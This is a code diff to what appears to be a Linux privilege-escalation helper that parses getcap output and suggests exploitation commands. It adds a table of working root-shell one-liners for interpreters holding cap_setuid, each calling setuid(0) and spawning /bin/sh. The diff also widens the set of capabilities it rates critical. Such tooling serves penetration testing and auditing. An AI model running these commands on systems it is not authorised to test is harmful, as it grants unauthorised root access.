@@ -31,9 +31,29 @@ _EXPLOITABLE_CAPS = {
     "cap_net_raw",
 }
 
-# Caps that are always CRITICAL regardless of GTFOBins coverage, because they
-# allow manual privilege escalation (setuid C program, Python one-liner, etc.)
-_ALWAYS_CRITICAL_CAPS = {"cap_setuid", "cap_setgid", "cap_sys_admin"}
+# Caps that are always CRITICAL regardless of GTFOBins coverage.
+# cap_dac_override/cap_dac_read_search allow bypassing file permission checks
+# on any binary, so they are always exploitable.
+_ALWAYS_CRITICAL_CAPS = {
+    "cap_setuid", "cap_setgid", "cap_sys_admin",
+    "cap_dac_override", "cap_dac_read_search",
+}
+
+# Interpreter binaries that can trivially exploit cap_setuid.
+# Maps normalized binary name → exploit command template (use {path} for full path).
+_CAP_SETUID_INTERPRETERS: Dict[str, str] = {
+    "python": "{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+    "python2": "{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+    "python3": "{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+    "perl": "{path} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
+    "node": "{path} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {{stdio: [0,1,2]}})'",
+    "nodejs": "{path} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {{stdio: [0,1,2]}})'",
+    "ruby": "{path} -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
+    "php": "{path} -r 'posix_setuid(0); system(\"/bin/sh\");'",
+    "lua": "{path} -e 'require(\"os\"); os.execute(\"/bin/sh\")'",
+    "wish": "echo 'exec /bin/sh' | {path}",
+    "tclsh": "echo 'exec /bin/sh' | {path}",
+}
 
 # Matches getcap output lines:
 #   /usr/bin/python3.9 = cap_setuid+ep
@@ -109,6 +129,24 @@ def normalize_binary(path: str) -> List[str]:
     return candidates
 
 
+def _has_cap_setuid(caps: str) -> bool:
+    """Return True if the capabilities string includes cap_setuid."""
+    for part in caps.split(","):
+        cap_name = part.split("+")[0].split("=")[0].strip().lower()
+        if cap_name == "cap_setuid":
+            return True
+    return False
+
+
+def _interpreter_cap_command(full_path: str) -> Optional[str]:
+    """Return a specific cap_setuid exploit command for interpreter binaries, or None."""
+    for candidate in normalize_binary(full_path):
+        template = _CAP_SETUID_INTERPRETERS.get(candidate)
+        if template:
+            return template.format(path=full_path)
+    return None
+
+
 def lookup_capabilities(binary: str) -> List[str]:
     """Return GTFOBins capabilities commands for a binary, or empty list if not found."""
     db = _load_db()
@@ -147,12 +185,20 @@ def analyze(section_text: str) -> List[Dict]:
         commands: List[str] = []
 
         if exploitable:
-            for candidate in normalize_binary(full_path):
-                cmds = lookup_capabilities(candidate)
-                if cmds:
-                    matched_as = candidate
-                    commands = _replace_binary(cmds, candidate, full_path)
-                    break
+            # Interpreter + cap_setuid → specific one-liner (highest priority)
+            if _has_cap_setuid(caps):
+                interp_cmd = _interpreter_cap_command(full_path)
+                if interp_cmd:
+                    commands = [interp_cmd]
+
+            # Fall back to GTFOBins capabilities commands
+            if not commands:
+                for candidate in normalize_binary(full_path):
+                    cmds = lookup_capabilities(candidate)
+                    if cmds:
+                        matched_as = candidate
+                        commands = _replace_binary(cmds, candidate, full_path)
+                        break
 
         caps_lower = caps.lower()
         is_always_critical = any(c in caps_lower for c in _ALWAYS_CRITICAL_CAPS)
